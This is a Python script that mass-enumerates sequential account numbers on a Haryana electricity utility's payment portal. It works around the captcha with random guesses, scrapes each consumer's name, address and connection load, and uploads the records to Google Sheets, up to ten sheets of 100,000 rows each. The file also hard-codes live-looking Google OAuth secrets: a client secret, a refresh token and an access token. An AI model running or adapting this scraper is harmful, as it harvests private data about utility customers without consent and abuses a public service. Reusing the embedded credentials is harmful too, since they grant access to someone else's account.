import requests, json, random, time, re
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

# 🔐 OAuth credentials
CLIENT_ID = "737936576743-5dq4nrm7gemrhcks9k4rj5jb0i1futqh.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REFRESH_TOKEN = "1//04rioeO3OMoFDCgYIARAAGAQSNwF-L9IrxEkA1bhsICknhjR10Wcg0RYOVLPHJutSu1YOeb3H3-5vvf4eawHNp_kOpBxuNangV80"
ACCESS_TOKEN = "ya29.a0AQQ_BDQaSOexCPwUTQJ6zWghKCGP-jOy3-WP7eyu1BPd1CWky05cCVh-NTHehDkawGku2mQE5ot8jvq4T-ILfLOBdIVPPcOpmvNgjac3f43NLftkJGZyhrAGWWfNsT0_FwtiWjUyvH7YV1tZADfCi4NsO_Sm5SWLotQ2PA5lCGJBvGLbX4HXiUoFfjC8MMQ3IJViO7YaCgYKAWUSARMSFQHGX2MinE_v9hNxbi8KB9J5sRWuww0206"

# 🌐 Target URL
url = "https://epayment.uhbvn.org.in/b2cpaybilladvance.aspx"

# 📄 Google Sheets setup
SHEET_PREFIX = "UHBVN_Accounts_"
MAX_ACCOUNTS_PER_SHEET = 100000
current_sheet_index = 1
accounts_written = 0
spreadsheet_ids = []

# 📋 Sheet headers
sheet_headers = ["account", "name", "address", "load", "error"]

# 🧠 Hidden form fields
# ====================================================================
hidden_fields = {
    "__EVENTTARGET": "",
    "__EVENTARGUMENT": "",
    "__VIEWSTATE": "/wEPDwULLTExOTgxNTI1NjIPZBYCAgIPZBYEAgUPZBYCAgsPDxYCHgRUZXh0ZRYEHgpvbmtleXByZXNzBUtOdW1lcmljQm94X05TX0FkZE51bWVyaWNJdGVtKGV2ZW50LCAndHh0bW9iaWxlJywgdHJ1ZSwgZmFsc2UsIC0xLCAnLicsIC0xKTseCG9uY2hhbmdlBR5OdW1lcmljQm94X05TX3R4dG1vYmlsZShldmVudClkAgcPZBYCAgkPDxYCHwBlFgQfAQVLTnVtZXJpY0JveF9OU19BZGROdW1lcmljSXRlbShldmVudCwgJ3R4dEFtb3VudCcsIHRydWUsIGZhbHNlLCAtMSwgJy4nLCAtMSk7HwIFHk51bWVyaWNCb3hfTlNfdHh0QW1vdW50KGV2ZW50KWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgUFCEJJTExERVNLBQNVQk8FB05lZnRZZXMFCU5lZnRJQ0lDSQUHTmVmdEJPQqb7AjaVUj4qg1vdjSgYCrIbcdprNCQUX1asAMIP7ATV",
    "__VIEWSTATEGENERATOR": "3D155CCF",
    "__EVENTVALIDATION": "/wEdABgH1QjLfaObk6/QiX81+tYxwqX48iQ/BOEYRUcG2kRxl8H3fvDr2EvDlueXpV8GeO0xJq7FPlKOHFBhS9vJjXHQwsQHZSgtak0GckVf30r3B3rOuTNWtuI4oTnTGbHrm6J9eoWt1VYsoV8N3B0z4auFH3nra93OB915opICXNmZSM34O/GfAV4V4n0wgFZHr3cJCINU3Zf7QS6Q8BtN2AgBS0yGv7RCxzINwXnW/9iE4uPrUuXgyiivfy73LCwMG2kzSJ/Ho+75/W5JrDcM9jIOH3EXzc6QJnG5nW8rKBPubzKclef9U7xGFg9Mgl55r8gcNlpvAow/ZI3vZE6GyfxIohlx63WKm+RO6PiKFDpe77v0X2PzWW66XPpYQtFb5Ou5ztp/aHnGzXf5V3ZlVWBGh1LSWKtqdpJdGpg/AJzErSM8mLwg8DTtPr4t4Wlfofe0Gg0NN/WnbR+w/IO0ihXTCneGDFU2v/lin3Lo4qVUHG8198tKhPvb8nM/HnIE5KYms/0ydnbCi6r2DdV4DamqM8PX/d7kFXH0kuxAL59G/w=="
}    
# ===============================================================

# 🔄 Refresh access token
def refresh_access_token():
    global ACCESS_TOKEN
    token_url = "https://oauth2.googleapis.com/token"
    payload = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "refresh_token": REFRESH_TOKEN,
        "grant_type": "refresh_token"
    }
    res = requests.post(token_url, data=payload)
    if res.status_code == 200:
        ACCESS_TOKEN = res.json()["access_token"]
        print("🔄 Access token refreshed.")
    else:
        print("❌ Token refresh failed:", res.text)

# ✅ Create new Google Sheet
def create_new_sheet():
    global current_sheet_index
    url = "https://sheets.googleapis.com/v4/spreadsheets"
    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
        "Content-Type": "application/json"
    }
    body = {
        "properties": {
            "title": f"{SHEET_PREFIX}{current_sheet_index}"
        }
    }
    res = requests.post(url, headers=headers, data=json.dumps(body))
    if res.status_code == 200:
        sheet_id = res.json()["spreadsheetId"]
        spreadsheet_ids.append(sheet_id)
        print(f"📄 Sheet created: {sheet_id}")
        write_headers(sheet_id)
        current_sheet_index += 1
        return sheet_id
    else:
        print("❌ Sheet creation failed:", res.text)
        return None

# 📝 Write headers
def write_headers(sheet_id):
    url = f"https://sheets.googleapis.com/v4/spreadsheets/{sheet_id}/values/Sheet1!A1:append"
    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
        "Content-Type": "application/json"
    }
    params = {"valueInputOption": "RAW"}
    data = {"values": [sheet_headers]}
    requests.post(url, headers=headers, params=params, data=json.dumps(data))

# 📤 Write batch to sheet
def write_batch_to_sheet(rows):
    global accounts_written
    if accounts_written >= MAX_ACCOUNTS_PER_SHEET or not spreadsheet_ids:
        sheet_id = create_new_sheet()
    else:
        sheet_id = spreadsheet_ids[-1]

    url = f"https://sheets.googleapis.com/v4/spreadsheets/{sheet_id}/values/Sheet1!A1:append"
    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
        "Content-Type": "application/json"
    }
    params = {"valueInputOption": "RAW"}
    data = {"values": rows}
    res = requests.post(url, headers=headers, params=params, data=json.dumps(data))
    if res.status_code == 200:
        accounts_written += len(rows)
        print(f"📊 {len(rows)} rows written to sheet.")
    elif res.status_code == 401:
        refresh_access_token()
        write_batch_to_sheet(rows)
    else:
        print("❌ Sheet write failed:", res.text)

# 🧠 Extract alerts from HTML
def extract_alerts(body_text):
    alerts = re.findall(r"alert\(['\"](.+?)['\"]\)", body_text)
    classified = []
    for msg in alerts:
        msg = msg.strip()
        if "grecaptcha" in msg:
            continue
        if "Enter Correct Captcha" in msg:
            classified.append(("CAPTCHA_ERROR", msg))
        elif "We are unable to fetch the Bill Details" in msg or "No Bill available" in msg:
            classified.append(("BILL_ALERT", msg))
        else:
            classified.append(("UNKNOWN_ALERT", msg))
    return classified

# 🧵 Process one account
def process_account(account):
    captcha = str(random.randint(1000, 9999))
    payload = hidden_fields.copy()
    payload.update({
        "txtacntnumber": account,
        "txtPPPNo": "",
        "txtmobile": "",
        "txtemail": "",
        "txtcaptcha": captcha,
        "txtAdhaarNo": "",
        "btnsubmit": "Proceed",
        "lblAcNo": "",
        "lblConsumerName": "",
        "lblAddress": "",
        "lblLoad": "",
        "txtAmount": "",
        "txtTransactionID": "",
        "txtIsConfirmed": "",
        "txtRegisteredMob": "",
        "txtIsMsgSend": ""
    })

    try:
        res = requests.post(url, headers={"Origin": "https://epayment.uhbvn.org.in", "Referer": "https://epayment.uhbvn.org.in"}, data=payload, timeout=15)
        if res.status_code != 200:
            return [account, "", "", "", f"HTTP {res.status_code}"]

        body_text = res.text
        alerts = extract_alerts(body_text)

        for tag, msg in alerts:
            if tag != "CAPTCHA_ERROR":
                return [account, "", msg, "", msg]

        soup = BeautifulSoup(body_text, "html.parser")
        account_no = soup.find(id="lblAcNo").get("value", "").strip() if soup.find(id="lblAcNo") else ""
        consumer_name = soup.find(id="lblConsumerName").get("value", "").strip() if soup.find(id="lblConsumerName") else ""
        load = soup.find(id="lblLoad").get("value", "").strip() if soup.find(id="lblLoad") else ""
        address = soup.find(id="lblAddress").text.strip() if soup.find(id="lblAddress") else ""

        return [account, consumer_name, address, load, ""]

    except Exception as e:
        return [account, "", "", "", f"EXCEPTION: {e}"]

# 🔢 Generate next batch of accounts
# def generate_next_batch(start_serial, count=100):
#     return [f"{str(start_serial + i).zfill(6)}2000" for i in range(count)]
def generate_next_batch(start_serial, count=100):
    return [f"{str(start_serial + i).zfill(10)}" for i in range(count)]

# 🔁 Retry loop
def retry_loop(start_serial):
    delay = 300  # 5 minutes
    while True:
        batch = generate_next_batch(start_serial)
        with ThreadPoolExecutor(max_workers=5) as executor:
            results = list(executor.map(process_account, batch))

        valid = [r for r in results if r[4] == "" or "No Bill" in r[4] or "unable to fetch" in r[4]]
        if valid:
            write_batch_to_sheet(results)
            return start_serial + 100
        else:
            print(f"⚠️ Server down or all failed. Retrying in {delay//60} min...")
            time.sleep(delay)
            delay = min(delay * 2, 3600)  # Max 1 hour
            
start_serial = 9999999750
# 🚀 Main flow
def main():
    # start_serial = 0
    global start_serial
    while current_sheet_index <= 10:
        start_serial = retry_loop(start_serial)

main()
